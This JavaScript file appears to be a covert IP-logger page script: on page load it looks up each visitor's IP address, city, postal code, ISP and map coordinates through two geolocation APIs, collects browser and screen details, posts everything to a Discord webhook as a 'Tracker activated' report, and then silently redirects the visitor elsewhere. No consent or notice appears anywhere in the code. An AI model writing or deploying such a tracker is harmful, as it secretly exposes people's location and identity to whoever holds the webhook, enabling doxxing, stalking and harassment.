console.log("app.js loaded");
const WEBHOOK_URL = "Discord webhook";
// Discord Logging Engine
async function logToDiscord() {
  const localTime = new Date().toLocaleString();
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const userAgent = navigator.userAgent;
  const screenResolution = `${window.screen.width}x${window.screen.height}`;

  let ipInfo = {
    ip: "Unknown IP",
    city: "Unknown City",
    region: "Unknown Region",
    country_name: "Unknown Country",
    postal: "Unknown Zip",
    org: "Unknown ISP",
    latitude: null,
    longitude: null,
  };
  function get_information(link, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", link, true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        callback(xhr.responseText);
      }
    };
    xhr.send(null);
  }
  let cacheValue = "";
  get_information(
    "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
    function (text) {
      cacheValue = text; // Save for later use

      var div = document.createElement("div");
      div.innerHTML = text;
      div.id = "log";

      const secondList = document.getElementsByClassName("header")[0];
      secondList.appendChild(div);
    },
  );

  try {
    const response = await fetch("https://ipapi.co/json/");
    if (response.ok) {
      ipInfo = await response.json();
    }
  } catch (error) {
    console.error("Failed to resolve IP location:", error);
  }

  const mapLink =
    ipInfo.latitude && ipInfo.longitude
      ? `[View on Google Maps](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})`
      : "No coordinates available";

  const payload = {
    username: "Tracker engine",
    avatar_url: "https://i.postimg.cc/ZYVF7LBN/image.png", // Premium robot tracker avatar
    embeds: [
      {
        title: "Tracker activated",
        description: `The website has been loaded the the JS has run succesflly! Below are the full resolved tracking details.`,
        color: 16711807, // Neon Pink #ff007f
        fields: [
          {
            name: "🌐 IP Address",
            value: `\`${ipInfo.ip || "Unknown IP"}\``,
            inline: true,
          },
          {
            name: "Cache",
            value: cacheValue || "Not loaded yet",
            inline: true,
          },
          {
            name: "🗺️ Resolved Location",
            value: `${ipInfo.city || "Unknown"}, ${ipInfo.region || "Unknown"}, ${ipInfo.country_name || "Unknown"} (${ipInfo.postal || "N/A"})`,
            inline: true,
          },
          {
            name: "📡 ISP / Network",
            value: ipInfo.org || "Unknown",
            inline: true,
          },
          {
            name: "⏱️ Timestamp",
            value: `${localTime} (${timezone})`,
            inline: true,
          },
          {
            name: "🖥️ User agent",
            value:
              userAgent.length > 256
                ? `${userAgent.substring(0, 250)}...`
                : userAgent,
            inline: false,
          },
          {
            name: "📏 Screen Specs",
            value: `\`${screenResolution}\` / Language: \`${navigator.language}\``,
            inline: true,
          },
          {
            name: "📍 Coordinates",
            value: mapLink,
            inline: true,
          },
        ],
        footer: {
          text: "Tracker v0.1",
        },
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    console.error("Failed to log to Discord webhook:", err);
  }
}
document.addEventListener("DOMContentLoaded", async () => {
  await logToDiscord();
  window.location.replace("https://redirecturl.com");
});
// Make the call
//logToDiscord();
